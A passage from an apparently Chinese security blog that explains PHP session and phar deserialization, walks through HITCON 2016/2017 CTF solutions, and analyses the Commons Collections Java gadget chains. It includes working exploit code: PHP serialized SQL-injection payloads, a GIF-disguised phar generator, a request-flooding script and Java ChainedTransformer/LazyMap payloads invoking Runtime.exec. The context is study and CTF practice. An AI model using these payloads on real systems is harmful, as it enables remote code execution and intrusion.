&quot;|&quot; . urlencode($a);?&gt; index.php 中涉及到了call_user_func 函数。PHP手册中 给了几个call_user_func 函数的例子: https://www.php.net/manual/zh/function.call-user-func.php其中需要注意的是当我们的第一个参数为数组时，会把第一个值当作类名，第二个值当作方法进行回调 为了进行反序列化只能利用PHP中SESSION反序列化机制。主要体现在差异性(当序列化的引擎和反序列化的引擎不一致时，就可以利用引擎之间的差异产生序列化注入漏洞)。但是在PHP中默认使用的是PHP引擎。所以这里为了展现session的差异性，我们需要通过代码手动构造差异性。 通过 call_user_func($_GET[&apos;f&apos;], $_POST); 构造PHP引擎差异性。并通过 $_SESSION[&apos;name&apos;] = $_GET[&apos;name&apos;]; 将构造的Soap类序列化字符串写入session文件 为了调用 __call 方法。首先利用call_user_func($_GET[&apos;f&apos;], $_POST);传入 f=extract 进行POST变量覆盖。随后通过GET传参令$_SESSION[&apos;name&apos;] = SoapClient。再利用POST传参进行变量b的覆盖。即调用 SoapClient 类不存在的 welcome_to_the_lctf2018 方法，从而触发 __call 方法发起 soap 请求进行 SSRF 。 最后携带cookie访问 Phar拓展攻击面Phar简介拓展攻击面体现在: 可通过构造 phar 在没有 unserailize() 的情况下实现反序列化攻击 由 PHPGGC 理解 PHP 反序列化漏洞 一文中对其概念概括十分简洁明了 简单来说phar就是php压缩文档。它可以把多个文件归档到同一个文件中，而且不经过解压就能被 php 访问并执行，与file:// ，php://等类似，也是一种流包装器。 phar结构由 4 部分组成 stub phar 文件标识，格式为 xxx&lt;?php xxx; __HALT_COMPILER();?&gt;； manifest 压缩文件的属性等信息，以序列化存储； contents 压缩文件的内容； signature 签名，放在文件末尾； 这里有两个关键点，一是文件标识，必须以__HALT_COMPILER();?&gt;结尾，但前面的内容没有限制，也就是说我们可以轻易伪造一个图片文件或者pdf文件来绕过一些上传限制；二是反序列化，phar存储的meta-data信息以序列化方式存储，当文件操作函数通过phar://伪协议解析phar文件时就会将数据反序列化，而这样的文件操作函数有很多。 利用条件: phar文件要能够上传到服务器端。 要有可用的魔术方法作为“跳板”。 文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。 生成Phar&lt;?php class TestObject { } @unlink(&quot;phar.phar&quot;); $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub $o = new TestObject(); $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering();?&gt; PS: 要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件 触发条件@secii 师傅文中提到: php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化 fileatime / filectime / filemtime stat / fileinode / fileowner / filegroup / fileperms file / file_get_contents / readfile / fopen file_exists / is_dir / is_executable / is_file / is_link / is_readable / is_writeable / is_writable parse_ini_file unlink copy 随后 @zsx 师傅blog中 Phar与Stream Wrapper造成PHP RCE的深入挖掘 对其进行了更深入的挖掘 exif exif_thumbnail exif_imagetype gd imageloadfont imagecreatefrom*** hash hash_hmac_file hash_file hash_update_file md5_file sha1_file file / url get_meta_tags get_headers standard getimagesize getimagesizefromstring zip$zip = new ZipArchive();$res = $zip-&gt;open(&apos;c.zip&apos;);$zip-&gt;extractTo(&apos;phar://test.phar/test&apos;); Bzip / Gzip如果限制了phar://不能出现在头几个字符。可用 compress.bzip2:// 和 compress.zlib:// 添加至 phar:// 前面进行 bypass$z = &apos;compress.bzip2://phar:///home/sx/test.phar/test.txt&apos;; MySQLLOAD DATA LOCAL INFILE也会触发这个php_stream_open_wrapper&lt;?phpclass A { public $s = &apos;&apos;; public function __wakeup () { system($this-&gt;s); }}$m = mysqli_init();mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);$s = mysqli_real_connect($m, &apos;localhost&apos;, &apos;root&apos;, &apos;123456&apos;, &apos;easyweb&apos;, 3306);$p = mysqli_query($m, &apos;LOAD DATA LOCAL INFILE \\&apos;phar://test.phar/test\\&apos; INTO TABLE a LINES TERMINATED BY \\&apos;\\r\\n\\&apos; IGNORE 1 LINES;&apos;); HITCON 递进反序列化HITCON 2016 babytrick网上没找到题目复现的docker环境，所以直接去 Github 上找的源码，对题目理解可能有失偏颇，敬请谅解。 题目代码如下 &lt;?phpinclude &quot;config.php&quot;;class HITCON{ private $method; private $args; private $conn; public function __construct($method, $args) { $this-&gt;method = $method; $this-&gt;args = $args; $this-&gt;__conn(); } function show() { list($username) = func_get_args(); $sql = sprintf(&quot;SELECT * FROM users WHERE username=&apos;%s&apos;&quot;, $username); $obj = $this-&gt;__query($sql); if ( $obj != false ) { $this-&gt;__die( sprintf(&quot;%s is %s&quot;, $obj-&gt;username, $obj-&gt;role) ); } else { $this-&gt;__die(&quot;Nobody Nobody But You!&quot;); } } function login() { global $FLAG; list($username, $password) = func_get_args(); $username = strtolower(trim(mysql_escape_string($username))); $password = strtolower(trim(mysql_escape_string($password))); $sql = sprintf(&quot;SELECT * FROM users WHERE username=&apos;%s&apos; AND password=&apos;%s&apos;&quot;, $username, $password); if ( $username == &apos;orange&apos; || stripos($sql, &apos;orange&apos;) != false ) { $this-&gt;__die(&quot;Orange is so shy. He do not want to see you.&quot;); } $obj = $this-&gt;__query($sql); if ( $obj != false &amp;&amp; $obj-&gt;role == &apos;admin&apos; ) { $this-&gt;__die(&quot;Hi, Orange! Here is your flag: &quot; . $FLAG); } else { $this-&gt;__die(&quot;Admin only!&quot;); } } function source() { highlight_file(__FILE__); } function __conn() { global $db_host, $db_name, $db_user, $db_pass, $DEBUG; if (!$this-&gt;conn) $this-&gt;conn = mysql_connect($db_host, $db_user, $db_pass); mysql_select_db($db_name, $this-&gt;conn); if ($DEBUG) { $sql = &quot;CREATE TABLE IF NOT EXISTS users ( username VARCHAR(64), password VARCHAR(64), role VARCHAR(64) ) CHARACTER SET utf8&quot;; $this-&gt;__query($sql, $back=false); $sql = &quot;INSERT INTO users VALUES (&apos;orange&apos;, &apos;$db_pass&apos;, &apos;admin&apos;), (&apos;phddaa&apos;, &apos;ddaa&apos;, &apos;user&apos;)&quot;; $this-&gt;__query($sql, $back=false); } mysql_query(&quot;SET names utf8&quot;); mysql_query(&quot;SET sql_mode = &apos;strict_all_tables&apos;&quot;); } function __query($sql, $back=true) { $result = @mysql_query($sql); if ($back) { return @mysql_fetch_object($result); } } function __die($msg) { $this-&gt;__close(); header(&quot;Content-Type: application/json&quot;); die( json_encode( array(&quot;msg&quot;=&gt; $msg) ) ); } function __close() { mysql_close($this-&gt;conn); } function __destruct() { $this-&gt;__conn(); if (in_array($this-&gt;method, array(&quot;show&quot;, &quot;login&quot;, &quot;source&quot;))) { @call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); } else { $this-&gt;__die(&quot;What do you do?&quot;); } $this-&gt;__close(); } function __wakeup() { foreach($this-&gt;args as $k =&gt; $v) { $this-&gt;args[$k] = strtolower(trim(mysql_escape_string($v))); } }}if(isset($_GET[&quot;data&quot;])) { @unserialize($_GET[&quot;data&quot;]); } else { new HITCON(&quot;source&quot;, array());} 漏洞代码核心: @unserialize($_GET[&quot;data&quot;]); 代码的全局过滤如下，主要过滤函数为 mysql_escape_string function __wakeup() { foreach($this-&gt;args as $k =&gt; $v) { $this-&gt;args[$k] = strtolower(trim(mysql_escape_string($v))); }} 关于此魔术方法的绕过为 CVE-2016-7124 代码中参数附值主要靠 call_user_func_array(),list(),func_get_args()三个函数共同作用。 首先 show 方法中动态拼接sql语句采取了 sprintf 函数。但其对单引号等敏感字符并没有转义功能，又因为我们可利用CVE-2016-7124 来绕过全局过滤。因此此处存在sql注入。 通过sql注入获得orange密码 &lt;?phpclass HITCON{ private $method=&quot;show&quot;; private $args=array(&quot;&apos; union select password,1,1 from users where username = &apos;orange&apos;#&quot;); private $conn=1;}$payload1 = new HITCON();echo urlencode(serialize($payload1));?&gt; 通过上述步骤得知 orange 的密码是 babytrick1234 接着进入 login 方法，这里通过用户名跟密码可以得到 flag。但其方法里一处限制如下 if ( $username == &apos;orange&apos; || stripos($sql, &apos;orange&apos;) != false ) { $this-&gt;__die(&quot;Orange is so shy. He do not want to see you.&quot;);} Bypass的点为 mysql的编码设置安全 猪猪侠在微博上曾经说过 MYSQL 中 utf8_unicode_ci和utf8_general_ci两种编码格式,utf8_general_ci不区分大小写,Ä = A, Ö = O, Ü = U这三种条件都成立,对于utf8_general_ci下面的等式成立：ß=s,但是，对于utf8_unicode_ci下面等式才成立：ß = ss 本地使用 DVWA 的库进行测试 因此通过替换关键字符，构造最终payload如下 &lt;?phpclass HITCON{ private $method; private $args; private $conn; public function __construct($method, $args) { $this-&gt;method = $method; $this-&gt;args = $args; }}$args[&apos;username&apos;] = &apos;ORÄNGE&apos;;$args[&apos;password&apos;] = &apos;babytrick1234&apos;;$data = new HITCON(&apos;login&apos;,$args);echo urlencode(serialize($data));?&gt; HITCON 2017 Baby-Master-PHP题目采用 i春秋 平台进行复现。其实本来最开始复现采用的是buu，但是buu的平台加载不了我服务器上的phar文件。后来就换了 题目源码 &lt;?php$FLAG = create_function(&quot;&quot;, &apos;die(`/read_flag`);&apos;);$SECRET = `/read_secret`;$SANDBOX = &quot;/var/www/data/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);@mkdir($SANDBOX);@chdir($SANDBOX);if (!isset($_COOKIE[&quot;session-data&quot;])) { $data = serialize(new User($SANDBOX)); $hmac = hash_hmac(&quot;sha1&quot;, $data, $SECRET); setcookie(&quot;session-data&quot;, sprintf(&quot;%s-----%s&quot;, $data, $hmac));}class User { public $avatar; function __construct($path) { $this-&gt;avatar = $path; }}class Admin extends User { function __destruct() { $random = bin2hex(openssl_random_pseudo_bytes(32)); eval(&quot;function my_function_$random() {&quot; . &quot; global \\$FLAG; \\$FLAG();&quot; . &quot;}&quot;); $_GET[&quot;lucky&quot;](); }}function check_session() { global $SECRET; $data = $_COOKIE[&quot;session-data&quot;]; list($data, $hmac) = explode(&quot;-----&quot;, $data, 2); if (!isset($data, $hmac) || !is_string($data) || !is_string($hmac)) { die(&quot;Bye&quot;); } if (!hash_equals(hash_hmac(&quot;sha1&quot;, $data, $SECRET), $hmac)) { die(&quot;Bye Bye&quot;); } $data = unserialize($data); if (!isset($data-&gt;avatar)) { die(&quot;Bye Bye Bye&quot;); } return $data-&gt;avatar;}function upload($path) { $data = file_get_contents($_GET[&quot;url&quot;] . &quot;/avatar.gif&quot;); if (substr($data, 0, 6) !== &quot;GIF89a&quot;) { die(&quot;Fuck off&quot;); } file_put_contents($path . &quot;/avatar.gif&quot;, $data); die(&quot;Upload OK&quot;);}function show($path) { if (!file_exists($path . &quot;/avatar.gif&quot;)) { $path = &quot;/var/www/html&quot;; } header(&quot;Content-Type: image/gif&quot;); die(file_get_contents($path . &quot;/avatar.gif&quot;));}$mode = $_GET[&quot;m&quot;];if ($mode == &quot;upload&quot;) { upload(check_session());} else if ($mode == &quot;show&quot;) { show(check_session());} else { echo &quot;IP:&quot;.$_SERVER[&quot;REMOTE_ADDR&quot;]; echo &quot;Sandbox:&quot;.&quot;/var/www/data/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]); highlight_file(__FILE__);} 上来第一行就是一个姿势点orz$FLAG = create_function(&quot;&quot;, &apos;die(/read_flag);&apos;);。根据php源码 匿名函数会被设置为\\x00lambda_%d ，其中 %d 为数字，取决于进程中匿名函数的个数，但是我们每访问一次题目，就会生成一个匿名函数，这样匿名函数的名字就不可控。这里需要参考: Apache 工作的三种模式：Prefork、Worker、Event可以通过大量的请求来迫使Pre-fork模式启动的Apache启动新的线程，这样这里的%d会刷新为1，就可以预测了。 Apache-prefork模型(默认模型)在接受请求后会如何处理,首先Apache会默认生成5个child server去等待用户连接, 默认最高可生成256个child server, 这时候如果用户大量请求, Apache就会在处理完MaxRequestsPerChild个tcp连接后kill掉这个进程,开启一个新进程处理请求。 随后代码初始化了用户沙箱。 题目中干扰最大的是check_session 函数。check_session 函数中具有反序列化的功能，但是 hash_equals 函数进行了数据校验，而 $SECRET 的值不可知。因此无法利用这点进行反序列化构造我们的payload 然后代码有两个类User、Admin。其分别是父类与子类。admin类中存在敏感函数eval。然后是一个 $_GET[&quot;lucky&quot;](); 这样的动态调用。 后面主要实现了两个功能，一个是写入一个文件，一个是返回文件路径。且对文件前几个字符进行了 GIF89a 的限制 之前是0day，现在已经有很多文章都分析过 phar 拓展反序列化的原理。 upload函数中 file_get_contents 这类文件相关操作会触发 phar，从而进行反序列化。 poc.php &lt;?phpclass Admin { public $avatar = &apos;orz&apos;; } $p = new Phar(__DIR__ . &apos;/avatar.phar&apos;, 0);$p[&apos;file.php&apos;] = &apos;&lt;?php ?&gt;&apos;;$p-&gt;setMetadata(new Admin());$p-&gt;setStub(&apos;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&apos;);rename(__DIR__ . &apos;/avatar.phar&apos;, __DIR__ . &apos;/avatar.gif&apos;);?&gt; 接着，我们需要通过大量请求，使 apache 重新开启一个新的线程 贴上 @orange 师傅的脚本 import requestsimport socketimport timefrom multiprocessing.dummy import Pool as ThreadPooltry: requests.packages.urllib3.disable_warnings()except: passdef run(i): while 1: HOST = &apos;x.x.x.x&apos; PORT = xx s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((HOST, PORT)) s.sendall(&apos;GET /avatar.gif HTTP/1.1\\nHost: yourip\\nConnection: Keep-Alive\\n\\n&apos;) # s.close() print &apos;ok&apos; time.sleep(0.5)i = 8pool = ThreadPool( i )result = pool.map_async( run, range(i) ).get(0xffff) 加载我们服务器上的phar文件http://117.50.3.97:8005/index.php?m=upload&amp;url=http://ip&apos; 利用脚本发出大量请求，使 apache 重新开启一个新的线程 最后访问http://117.50.3.97:8005/index.php?m=upload&amp;url=phar:///var/www/data/xxx/&amp;lucky=%00lambda_1 referhttps://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label2_1https://coomrade.github.io/2018/10/26/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E9%9D%A2%E6%8B%93%E5%B1%95%E6%8F%90%E9%AB%98%E7%AF%87/https://www.smi1e.top/lctf2018-bestphps-revenge-%E8%AF%A6%E7%BB%86%E9%A2%98%E8%A7%A3/https://blog.zsxsoft.com/post/38","link":"/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"title":"Commons Collections 反序列化利用链分析","text":"本篇文章为 Apache Commons Collections 反序列化利用链分析 [TOC] Preface在 CommonsCollections 生态中，3 的最后一个版本是 3.2.2。再次基础上很多利用链都失效了。下图 JDK 版本只是大版本普遍适用情况，不代表细致的利用版本 ysoserial info CommonsCollections1 @frohoff commons-collections:3.1CommonsCollections2 @frohoff commons-collections4:4.0CommonsCollections3 @frohoff commons-collections:3.1CommonsCollections4 @frohoff commons-collections4:4.0CommonsCollections5 @matthias_kaiser, @jasinner commons-collections:3.1CommonsCollections6 @matthias_kaiser commons-collections:3.1CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1 CommonsCollections1 命令执行载体：org.apache.commons.collections.functors.ChainedTransformer 反序列化载体：AnnotationInvocationHandler 见前文 CommonsCollections2 命令执行载体：org.apache.xalan.xsltc.trax.TemplatesImpl 反序列化载体：PriorityQueue PriorityQueue.readObject()执行排序时，TransformingComparator.compare()会调用InvokerTransformer.transform()转换元素，进而获取第一个元素TemplatesImpl的newTransformer()并调用，最终导致命令执行 CommonsCollections3 命令执行载体：org.apache.commons.collections.functors.ChainedTransformer 反序列化载体：AnnotationInvocationHandler 除Transformer数组元素组成不同外，与CommonsCollections1基本一致 CommonsCollections4 命令执行载体：org.apache.commons.collections.functors.ChainedTransformer 反序列化载体：PriorityQueue PriorityQueue.readObject()执行排序时，TransformingComparator.compare()会调用ChainedTransformer.transform()转换元素，进而遍历执行Transformer数组中的每个元素，最终导致命令执行 CommonsCollections5 命令执行载体：org.apache.commons.collections.functors.ChainedTransformer 反序列化载体：BadAttributeValueExpException BadAttributeValueExpException.readObject()当System.getSecurityManager()为null时，会调用TiedMapEntry.toString()，它在getValue()时会通过LazyMap.get()取值，最终导致命令执行 CommonsCollections6 命令执行载体：org.apache.commons.collections.functors.ChainedTransformer 反序列化载体：HashSet HashSet.readObject()反序列化各元素后，会调用HashMap.put()将结果放进去，而它通过TiedMapEntry.hashCode()计算hash时，会调用getValue()触发LazyMap.get()导致命令执行 CommonsCollections7 命令执行载体：org.apache.commons.collections.functors.ChainedTransformer 反序列化载体：Hashtable Hashtable#readObject反序列化各元素后，会调用reconstitutionPut，后面利用链中在比较hash值的时候用到了hashcode相等的两个字符串 yy 和 zZ。最后后AbstractMap#equals 触发LazyMap.get()导致命令执行 CommonsCollections1Basics开始之前需要理清以下几个方面 Transformer ConstantTransformer InvokerTransformer ChainedTransformer AnnotationInvocationHandler 根据其源码，结合 java.lang.Runtime 可以构成一个命令执行，需要注意的是 Runtime 为单例模式，而且没有继承 Serializable， 因此调用 getRuntime 之后获得的类实例不能反序列化。命令执行前提是调用构造的 ChainedTransformer 的 transform。由此构造出来的命令执行代码是这样的 Level-0 payload public class CommandDemo { public static void main(String[] args) { ChainedTransformer demo = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0]}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open -a Calculator&quot;})}); demo.transform(String.class); }} 弄清楚上述 payload 只需要解决以下几个问题： 各 Transformer 的作用，以及他们之间的联系 为什么需要一个返回原本传入对象的 ConstantTransformer ，这种方式不是多此一举么？ 为什么需要反射调用 getRuntime，而不是直接传入 Runtime.getRuntime ？ CommonsCollections1 网上的 POC 其实也涉及到了两个利用链 TransformedMap（网上流传的利用链） LazyMap （ysoserial 中利用链） 这里引用 @phithon 师傅 Java安全漫谈 的一段话 既然ysoserial中没有用到TransformedMap，那么TransformedMap究竟是谁最先提出来的呢？ 据我的考证，最早讲到TransformedMap应该是Code White的这篇Slide：Exploiting Deserialization Vulnerabilities in Java，后来长亭科技的博客文章《Lib之过？Java反序列化漏洞 通用利用分析》对此进行了进一步分析，后来才在国内众多文章中被讲到。 其漏洞利用差别在于执行 transform 的不同 相同的是均无法解决 CommonCollections1 这条利用链在高版本Java（8u71以后）中的使用问题 TransformedMap Gadget chain利用链是 TransformedMap ，先对我们之前 level-0 的 payload 进行一个升级，同样是最基础的命令执行，但是不直接使用 ChainedTransformer 的 transform 方法触发，而改用 TransformedMap 的方法 首先 TransformedMap 中有这三个类调用了 transform 方法，但都是 protected 方法，因此需要找到间接调用它们的方法 下面两个方法间接调用了 transformKey 和 transformValue 两个方法，且都是 public 方法（checkSetValue 方法后文再提） Level-1 payload public class CommandDemo { public static void main(String[] args) { ChainedTransformer chainDemo = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0]}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{ (&quot;open -a Calculator&quot;)})}); TransformedMap outerMap = (TransformedMap) TransformedMap.decorate(new HashMap&lt;String, String&gt;(), null, chainDemo); outerMap.put(&quot;test&quot;, &quot;test&quot;); }} 两个关键点如下 首先调用 decorate 方法的时候对 valueTransformer 进行了附值，并返回了一个 TransformedMap 对象 后续在 TransformedMap#transformValue 调用了 transform 方法 debug 一下我们会发现，如果我们是这么写的，那么不会触发命令执行 outMap.put(&quot;test&quot;, null); 上述代码虽然能够命令执行，但是不是反序列化利用链需要用到的命令执行的点，因此我们对上述代码进行改进，使其更接近我们反序列化利用链调用的方法，这里需要用到上文我们提到过的 checkSetValue Level-2 payload public class CommandDemo { public static void main(String[] args) { ChainedTransformer chainDemo = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0]}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{ (&quot;open -a Calculator&quot;)})}); Map innerMap = new HashMap(); innerMap.put(null, null); Map outerMap = TransformedMap.decorate(innerMap, null, chainDemo); Map.Entry entryDemo = (Map.Entry) outerMap.entrySet().iterator().next(); entryDemo.setValue(null); }} outerMap 经过 entrySet -&gt; iterator -&gt; next 方法， 最终使 MapEntry类的 this.parent 变量被附值成 TransformedMap类的对象 outerMap 在最后调用的时候先触发 MapEntry 的 setValue 然后调用其早就构造好的 valueTransformer 的 transform 方法 对于目前来说，手动触发命令执行显然达不到反序列化利用的标准，由此我们需要从 readObject 开始下手。于是找到 AnnotationInvocationHandler 这个类，需要注意的是这个类不能被外部类访问到，所以需要反射去调用它 Level-3 TransformedMap 利用链 payload public class TransformedMapDemo { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException { ChainedTransformer chainDemo = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0]}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{ (&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;)})}); Map innerMap = new HashMap(); innerMap.put(&quot;key&quot;, &quot;random&quot;); Map outerMap = TransformedMap.decorate(innerMap, null, chainDemo); Constructor construct = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class); construct.setAccessible(true); InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap); ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(bos); oos.writeObject(handler); oos.close(); System.out.println(bos); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bos.toByteArray())); ois.readObject(); }} 调用栈 transform:121, ChainedTransformer (org.apache.commons.collections.functors)checkSetValue:169, TransformedMap (org.apache.commons.collections.map)setValue:191, AbstractInputCheckedMapDecorator$MapEntry (org.apache.commons.collections.map)readObject:353, AnnotationInvocationHandler (sun.reflect.annotation)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:57, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:601, Method (java.lang.reflect)invokeReadObject:1004, ObjectStreamClass (java.io)readSerialData:1891, ObjectInputStream (java.io)readOrdinaryObject:1796, ObjectInputStream (java.io)readObject0:1348, ObjectInputStream (java.io)readObject:370, ObjectInputStream (java.io)main:44, TransformedMapDemo (com.p2hm1n.cc.cc1) 看一下 AnnotationInvocationHandler#readObject 大概就知道了，在调用 setValue 后就跟 level-2 的payload 一样了 提炼一下 AnnotationInvocationHandler 的特征 类的构造方法接收Map对象 这个类需要重写 readObject方法，重写的 readObject 方法中会调用到 AbstractMapEntryDecorator子类 MapEntry 的 setValue方法 下面分析一下这个 payload 的限制：innerMap.put(&quot;value&quot;, &quot;random&quot;); 限制是：在不改动下面的代码的传参情况下，上面代码的第一个参数必须为 value 可能涉及各种版本改动问题，不同的版本的源代码不一样，我 JDK7u21 版本下第一个参数只能传注解类 InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap); 看一下构造方法 在 AnnotationInvocationHandler#readObject 中 var2 获取到注解类实例，其中包含很多信息 核心代码如下，为了触发 RCE，需要满足 var7 != null，var3 是获取了 var2 信息的 Hashmap，var6是 我们传入的 value 字符串，几经周转在 MapEntry 调用 getKey 得到。 因此 var7 其实是get获取键为 “value” 的key的value值 当 innerMap 的值为其他时，var7为空，不会触发到后面的RCE利用点 最后总结一下限制为： handler 第一个参数必须是元注解类 （其实好像也就 Retention 跟 Target 能用） innerMap 第一个参数必须是注解类的方法名 LazyMap Gadget chain同理，我们先对 level-0 的代码进行升级，使其利用到 LazyMap 的方法去触发 chain 的 transform Level-1 payload public class CommandDemo { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException { ChainedTransformer chainDemo = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0]}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{ (&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;)})}); Map innerMap = new HashMap(); Class clz = Class.forName(&quot;org.apache.commons.collections.map.LazyMap&quot;); Constructor construct = clz.getDeclaredConstructor(Map.class, Transformer.class); construct.setAccessible(true); LazyMap mapDemo = (LazyMap) construct.newInstance(innerMap, chainDemo); mapDemo.get(&quot;random&quot;); }} Lazy不可以直接 new 来实例化，需要通过反射调用。在实例化的时候调用构造方法对 this.factory 进行了附值 LazyMap 的 get 方法调用了已经附值的 this.factory 的 transform 方法，我们手动调用了 LazyMap 的 get 方法，因此会命令执行 获取实例化也可以通过 LazyMap#decorate Level-2 payload public class CommandDemo { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException { ChainedTransformer chainDemo = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0]}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{ (&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;)})}); Map innerMap = new HashMap(); LazyMap mapDemo = (LazyMap) LazyMap.decorate(innerMap, chainDemo); mapDemo.get(&quot;random&quot;); }} 由于上面我们是手工调用的 LazyMap 的 get 方法，我们需要结合反序列化自动调用的话，跟上面 TransformedMap 一样，需要找一个重写的 readObject 里面调用了 get 方法的。这里使用到的还是 AnnotationInvocationHandler。 Level-3 LazyMap 利用链 payload public class LazyMapDemo { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException { ChainedTransformer chainDemo = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0]}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{ (&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;)})}); Map innerMap = new HashMap(); Class clz = Class.forName(&quot;org.apache.commons.collections.map.LazyMap&quot;); Constructor construct = clz.getDeclaredConstructor(Map.class, Transformer.class); construct.setAccessible(true); LazyMap mapDemo = (LazyMap) construct.newInstance(innerMap, chainDemo); Constructor handler_construct = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class); handler_construct.setAccessible(true); InvocationHandler map_handler = (InvocationHandler) handler_construct.newInstance(Override.class, mapDemo); Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class}, map_handler); Constructor AnnotationInvocationHandler_Construct = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class); AnnotationInvocationHandler_Construct.setAccessible(true); InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Construct.newInstance(Override.class, proxy_map); ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(bos); oos.writeObject(handler); oos.close(); System.out.println(bos); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bos.toByteArray())); ois.readObject(); }} 三个关键点：this.memberValues、invoke 和 this.memberValues.entrySet() 首先 this.memberValues 在第一个InvocationHandler 对象中被设置成了构造好的 LazyMap，只需要调用其 get 方法即可 RCE 其次动态代理中，调用动态的代理对象任何方法，均会触发之前 InvocationHandler 对象的 invoke 方法 最后 AnnotationInvocationHandler#invoke 中调用了 get 利用链 Gadget chain: ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() CommonsCollections2Basicsjavassist 动态编程主要是在内存中动态的生成 Java 代码 Demo 代码直接引用 @p1g3 